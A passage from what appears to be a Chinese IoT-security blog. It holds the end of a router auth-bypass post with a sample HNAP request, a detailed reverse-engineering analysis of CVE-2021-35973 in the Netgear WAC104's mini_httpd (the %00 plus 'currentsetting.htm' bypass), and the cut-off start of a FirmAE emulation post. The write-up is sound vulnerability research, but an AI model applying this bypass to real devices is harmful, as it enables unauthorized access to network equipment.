&quot;http://purenetworks.com/HNAP1/GetIPv6Status&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Referer: http://192.168.0.1/Home.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: uid=uFXfaJBA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetIPv6Status xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在分析该漏洞的过程中，先通过寻找中间未加密固件的方式，对存在漏洞的加密固件进行了解密；然后通过启动项分析定位webserver，分析配置文件梳理路由请求逻辑得到处理程序prog.cgi；最后发现prog.cgi类似goahead，根据之前对goahead认证处理的了解定位到认证逻辑，并分析漏洞的认证绕过流程。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2020/08/28/bypass_auth/">IoT 设备中身份验证绕过的一些漏洞(1) | CataLpa’s Site</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/06/CVE-2021-35973%20netgear%20wac104%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%86%8D%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/06/CVE-2021-35973%20netgear%20wac104%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%86%8D%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2021-35973 netgear wac104登录认证绕过再分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-06 05:39:55" itemprop="dateCreated datePublished" datetime="2023-09-06T05:39:55+08:00">2023-09-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-13 10:33:45" itemprop="dateModified" datetime="2023-09-13T10:33:45+08:00">2023-09-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2021-35973是发生在netgear wac104设备、固件版本1.0.4.15之前的身份认证绕过漏洞，漏洞产生的原因是在鉴权过程中，使用了strstr来判断：如果请求uri中包含currentsetting.htm，设置无需认证标志。因此攻击者可以在需要鉴权的uri中包含currentsetting.htm标志，从而达到认证绕过的目的。</p>
<p>漏洞描述：<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35973">CVE - CVE-2021-35973</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>netgear系列的固件可以直接从官网下载，而且可以直接使用binwalk解压，固件下载链接如下：<br><a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/wac104.aspx#download">WAC104 | Access Point | NETGEAR Support</a></p>
<h3 id="webserver架构分析"><a href="#webserver架构分析" class="headerlink" title="webserver架构分析"></a>webserver架构分析</h3><p>在文件系统中直接搜索字符串httpd可以定位到启动脚本，因此猜测httpd是通过程序&#x2F;usr&#x2F;sbin&#x2F;rc启动的，而且一个是开放在WAN口，一个是开放在LAN口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/rc httpd start</span><br><span class="line">/usr/sbin/rc remote_httpd start</span><br></pre></td></tr></table></figure>

<p>对程序&#x2F;usr&#x2F;sbin&#x2F;rc进行逆向，搜索字符串httpd，寻找相关字符串的交叉引用，可以看到应该是采用了mini_httpd作为webserver。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:00464610                 .word aUsrBinKillallR_0+0x18  # &quot;httpd&quot;</span><br><span class="line">.data:00464614                 .word mini_httpd_start</span><br><span class="line">.data:00464618                 .word mini_httpd_stop</span><br><span class="line">.data:0046461C                 .word httpd_init</span><br><span class="line">.data:00464620                 .word aRemoteHttpd   # &quot;remote_httpd&quot;</span><br><span class="line">.data:00464624                 .word mini_httpd_remote_start</span><br><span class="line">.data:00464628                 .word mini_httpd_remote_stop</span><br></pre></td></tr></table></figure>

<p>该漏洞是WAN口、LAN口都存在，因此针对影响较大的WAN口的remote_httpd进行分析。根据如下的逆向逻辑，remote_httpd是链接到程序&#x2F;sbin&#x2F;mini_httpd，启动参数也很清晰，下一步对&#x2F;sbin&#x2F;mini_httpd进行分析。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( access(<span class="string">&quot;/var/remote_httpd&quot;</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  system(<span class="string">&quot;/bin/ln -sf /sbin/mini_httpd /var/remote_httpd&quot;</span>);</span><br><span class="line">nv_set_int(<span class="string">&quot;http&quot;</span>, <span class="string">&quot;remotemg_port&quot;</span>, <span class="number">0</span>, v3);</span><br><span class="line">v4 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;product_name&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v4 )</span><br><span class="line">  v4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">v7 = v4;</span><br><span class="line">v5 = atoi(v1);</span><br><span class="line">SYSTEM(</span><br><span class="line">  <span class="string">&quot;/var/remote_httpd -p %d -P %d -d /www -S -E /etc/mini_httpd.pem -r \&quot;NETGEAR %s\&quot; -c &#x27;**.cgi&#x27; -t %d&amp;&quot;</span>,</span><br><span class="line">  v3,</span><br><span class="line">  v3,</span><br><span class="line">  v7,</span><br><span class="line">  <span class="number">60</span> * v5);</span><br></pre></td></tr></table></figure>
<h3 id="mini-httpd请求包处理逻辑"><a href="#mini-httpd请求包处理逻辑" class="headerlink" title="mini_httpd请求包处理逻辑"></a>mini_httpd请求包处理逻辑</h3><p>根据以往对mini_httpd代码的了解，其处理请求包的逻辑主要是由handler_request函数负责，可以通过搜索index页面字符串定位到该函数。如下是mini_httpd源码中的handle_request函数和其中设置的index页面字符串列表。</p>
<p><strong>定位到handle_request函数</strong>：搜索如下列表中的字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="type">const</span> <span class="type">char</span>* index_names[] = &#123;</span><br><span class="line"><span class="string">&quot;index.html&quot;</span>, <span class="string">&quot;index.htm&quot;</span>, <span class="string">&quot;index.xhtml&quot;</span>, <span class="string">&quot;index.xht&quot;</span>, <span class="string">&quot;Default.htm&quot;</span>,</span><br><span class="line"><span class="string">&quot;index.cgi&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>mini_httpd收到一个数据请求包后会fork创建一个子进程来进行处理，这种方式如果在高并发场景会在进程创建、销毁过程中消耗大量的资源，但是在并发量低的嵌入式设备已经够用了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fork a sub-process to handle the connection. */</span></span><br><span class="line">r = fork();</span><br><span class="line"><span class="keyword">if</span> ( r &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    syslog( LOG_CRIT, <span class="string">&quot;fork - %m&quot;</span> );</span><br><span class="line">    perror( <span class="string">&quot;fork&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> ( r == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">/* Child process. */</span></span><br><span class="line">    client_addr = usa;</span><br><span class="line">    <span class="keyword">if</span> ( listen4_fd != <span class="number">-1</span> )</span><br><span class="line">	(<span class="type">void</span>) close( listen4_fd );</span><br><span class="line">    <span class="keyword">if</span> ( listen6_fd != <span class="number">-1</span> )</span><br><span class="line">	(<span class="type">void</span>) close( listen6_fd );</span><br><span class="line">    handle_request();       <span class="comment">// 数据包处理逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">(<span class="type">void</span>) close( conn_fd );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子进程中主要是通过handle_request函数来对数据进行处理的，主要是先解析请求行、再解析请求头。</p>
<ul>
<li>读取请求的第一行，获取到请求行，然后从行中解析到请求方法protocol、请求路径path和查询参数query</li>
<li>随后解析header，主要实现是通过while循环继续逐行解析header中的字段，包括Authorization、Content-Length、Content-Type、Cookie、User-Agent等等常见的字段</li>
</ul>
<p>如下是handle_request函数中读取请求行，获取到请求method_str、path、query、protocol。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* Parse the first line of the request. */</span></span><br><span class="line">   method_str = get_request_line();</span><br><span class="line">   <span class="keyword">if</span> ( method_str == (<span class="type">char</span>*) <span class="number">0</span> )</span><br><span class="line">send_error( <span class="number">400</span>, <span class="string">&quot;Bad Request&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Can&#x27;t parse request.&quot;</span> );</span><br><span class="line">   path = <span class="built_in">strpbrk</span>( method_str, <span class="string">&quot; \t\012\015&quot;</span> );</span><br><span class="line">   <span class="keyword">if</span> ( path == (<span class="type">char</span>*) <span class="number">0</span> )</span><br><span class="line">send_error( <span class="number">400</span>, <span class="string">&quot;Bad Request&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Can&#x27;t parse request.&quot;</span> );</span><br><span class="line">   *path++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   path += <span class="built_in">strspn</span>( path, <span class="string">&quot; \t\012\015&quot;</span> );</span><br><span class="line">   protocol = <span class="built_in">strpbrk</span>( path, <span class="string">&quot; \t\012\015&quot;</span> );</span><br><span class="line">   <span class="keyword">if</span> ( protocol == (<span class="type">char</span>*) <span class="number">0</span> )</span><br><span class="line">send_error( <span class="number">400</span>, <span class="string">&quot;Bad Request&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Can&#x27;t parse request.&quot;</span> );</span><br><span class="line">   *protocol++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   protocol += <span class="built_in">strspn</span>( protocol, <span class="string">&quot; \t\012\015&quot;</span> );</span><br><span class="line">   query = <span class="built_in">strchr</span>( path, <span class="string">&#x27;?&#x27;</span> );</span><br><span class="line">   <span class="keyword">if</span> ( query == (<span class="type">char</span>*) <span class="number">0</span> )</span><br><span class="line">query = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">*query++ = <span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>然后是while循环处理header，获取字段。在源码中包括：Authorization、Content-Length、Content-Type、Cookie、Host、If-Modified-Since、Referer、Referrer、User-Agent这些字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* Parse the rest of the request headers. */</span></span><br><span class="line">   <span class="keyword">while</span> ( ( line = get_request_line() ) != (<span class="type">char</span>*) <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( line[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">&quot;Authorization:&quot;</span>, <span class="number">14</span> ) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    cp = &amp;line[<span class="number">14</span>];</span><br><span class="line">    cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span> );</span><br><span class="line">    authorization = cp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( strncasecmp( line, <span class="string">&quot;Content-Length:&quot;</span>, <span class="number">15</span> ) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    cp = &amp;line[<span class="number">15</span>];</span><br><span class="line">    cp += <span class="built_in">strspn</span>( cp, <span class="string">&quot; \t&quot;</span> );</span><br><span class="line">    content_length = atol( cp );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>获取到了如上的重要字段后，就开始对数据包的合法性进行判断，例如：</p>
<ul>
<li>请求方法method是否合理：GET、HEAD、POST、PUT、DELETE、TRACE</li>
<li>请求路径path必须以反斜杠<code>/</code>开头、对path进行目录穿越相关字符进行处理、检查文件是否存在</li>
<li>然后根据path是文件夹或文件，分别调用do_dir和do_file进行处理，二者最终都会进行权限检查函数auth_check</li>
</ul>
<p>在权限检查函数auth_check中，输入为请求的path转换的实际路径file所在的文件夹dirname，如果权限检查通过，则继续直接随后的数据包处理流程；如果权限检查是否，则通过send_authenticate函数返回401，然后结束当前连接的生命周期。</p>
<p>权限检查的流程则是：</p>
<ol>
<li>如果dirname中没有.htpasswd文件，那么直接认证通过。就相当于是在需要授权访问的文件夹中添加该文件，不需要授权访问的文件夹中没有该文件</li>
<li>源码中采用的校验方式是BASIC认证，请求包中带上username和base64编码的password，然后和.htpasswd文件中保存的账号信息进行对比，如果比较通过则直接返回。</li>
</ol>
<p>因此，平常漏洞挖掘中比较关心的登录认证流程就非常清晰：main -&gt; handle_request -&gt; do_file&#x2F;do_dir -&gt; auth_check。一般情况下，厂商会根据自己的业务逻辑修改相关的函数，但是根据源码我们还是能通过一些字符串特征来定位到关键函数，例如：</p>
<ul>
<li>通过搜索index相关的页面字符串，可以定位到handle_request<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0041E030 index_names:    .word aSetupCgi          # DATA XREF: handle_request+38↑o</span><br><span class="line">.data:0041E030                                          # &quot;setup.cgi&quot;</span><br><span class="line">.data:0041E034                 .word aIndexHtml         # &quot;index.html&quot;</span><br><span class="line">.data:0041E038                 .word aIndexHtm          # &quot;index.htm&quot;</span><br><span class="line">.data:0041E03C                 .word aIndexXhtml        # &quot;index.xhtml&quot;</span><br><span class="line">.data:0041E040                 .word aIndexXht          # &quot;index.xht&quot;</span><br><span class="line">.data:0041E044                 .word aDefaultHtm        # &quot;Default.htm&quot;</span><br></pre></td></tr></table></figure></li>
<li>通过搜索字符串.htpasswd可以直接定位到do_file、auth_check函数。do_file函数中会检查请求文件是否为.htpasswd，auth_check函数则是需要读取账号信息、调用字符串比较函数等</li>
</ul>
<p>可以看出，mini_httpd的登录认证处理流程还是比较简单的。</p>
<h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>通过之前的源代码梳理，也明白了mini_httpd的登录认证流程，那么可以通过搜索字符串的技巧直接定位到auth_check函数。auth_check函数开头有一段导致后续认证绕过的逻辑，其中有一个g_bypass_flag&#x3D;1时可以直接通过认证。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( g_bypass_flag == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4062C0() )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie from wan, drop request &gt; /dev/console&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = system(<span class="string">&quot;/bin/echo genie from lan, ok &gt; /dev/console&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看变量g_bypass_flag的交叉引用，赋值的地方一共包含如下的三处：</p>
<ol>
<li>当请求path中包含currentsetting.htm的时候<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(v86, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">  g_bypass_flag = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li>SOAPAction相关，设计的初衷应该是可以访问任意SOAP的xml。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v26 = strncasecmp(v34, <span class="string">&quot;Accept-Language:&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  v27 = v34;</span><br><span class="line">  <span class="keyword">if</span> ( v26 )</span><br><span class="line">  &#123;</span><br><span class="line">    v30 = v34 + <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(v27, <span class="string">&quot;SOAPAction:&quot;</span>, <span class="number">11</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v31 = <span class="built_in">strspn</span>(v30, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      v32 = strcasestr(&amp;v30[v31], <span class="string">&quot;urn:NETGEAR-ROUTER:service:&quot;</span>);</span><br><span class="line">      v33 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v32 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *(<span class="type">char</span> *)(v32 + v33 + <span class="number">27</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v11 == <span class="string">&#x27;:&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          byte_420224[v33++] = v11;</span><br><span class="line">        &#125;</span><br><span class="line">        byte_420224[v33] = <span class="number">0</span>;</span><br><span class="line">        g_bypass_flag = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li>请求path中包含setupwizard.cgi，但是随后的处理逻辑会调用exit退出，因此无法利用。这个可能是当设备首次启动、开始安装向导触发的。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)g_path, <span class="string">&quot;setupwizard.cgi&quot;</span>) )</span><br><span class="line">  g_bypass_flag = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>再次返回到mini_httpd的源代码中，结合固件中的反汇编</p>
<ul>
<li>首先通过查找method后的第一个空格、换行、制表符的方式，获取到path。但是随后没有对path中是否包含%00进行判断。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="built_in">strpbrk</span>(v8, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">g_path = v10;</span><br></pre></td></tr></table></figure></li>
<li>获取到的path在内存中大概是：<code>uri\0currentsetting.htm</code>，这导致，strstr函数返回一个非空值，就设置了g_bypass_flag，从而通过了auth_check<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">v86 = (<span class="type">const</span> <span class="type">char</span> *)g_path;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(v86, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">  g_bypass_flag = <span class="number">1</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文首先分析了mini_httpd中如何对请求包进行处理，登录认证的大致逻辑是什么；随后介绍了搜索字符串的方式在mini_httpd程序中快速定位到请求包处理函数handle_request和权限处理函数auth_check；最后反编译+结合源码的方式，分析了认证绕过的触发逻辑。</p>
<p>这个漏洞实际上刚开始接触IoT漏洞的时候分析过，但是当时对漏洞的触发、利用逻辑虽然分析了，但是不是很有逻辑，后续回头看感觉分析得真烂。这次结合mini_httpd源码分析，也学习到了以后如何去寻找相关的认证绕过思路。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/19/FirmAE%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BB%BF%E7%9C%9F%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/19/FirmAE%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BB%BF%E7%9C%9F%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">FirmAE：网络仿真配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-19 05:59:18" itemprop="dateCreated datePublished" datetime="2023-04-19T05:59:18+08:00">2023-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-20 11:25:53" itemprop="dateModified" datetime="2023-04-20T11:25:53+08:00">2023-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/FirmAE/" itemprop="url" rel="index"><span itemprop="name">FirmAE</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在run.sh中，FirmAE会检查当前固件是否在之前仿真成功过，如果是第一次仿真或者是之前仿真失败，FirmAE会重新开始创建镜像、生成qemu启动网络配置的工作；如果之前已经仿真成功了，则直接执行之前的启动命令。</p>
<h2 id="run-sh：是否之前仿真成功"><a href="#run-sh：是否之前仿真成功" class="headerlink" title="run.sh：是否之前仿真成功"></a>run.sh：是否之前仿真成功</h2><p>如下是关键代码，其中<code>$&#123;WORK_DIR&#125;</code>目录是工作目录，对应着实际的目录<code>scratch/固件编号/</code>目录。<code>$&#123;WORK_DIR&#125;/web</code>是web仿真成功的标志文件，FirmAE仿真成功一个目录则会在其中写入<code>true</code>。<code>./scripts/makeImage.sh</code>是创建qemu镜像、将文件系统写入到镜像、并对文件系统做修改的脚本；<code>./scripts/makeNetwork.py</code>则是负责生成qemu运行命令、配置qemu启动命令的参数，也是这篇文章将要简单说明的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">if (! egrep -sqi &quot;true&quot; $&#123;WORK_DIR&#125;/web); then</span><br><span class="line">    # ================================</span><br><span class="line">    # make qemu image</span><br><span class="line">    # ================================</span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    # 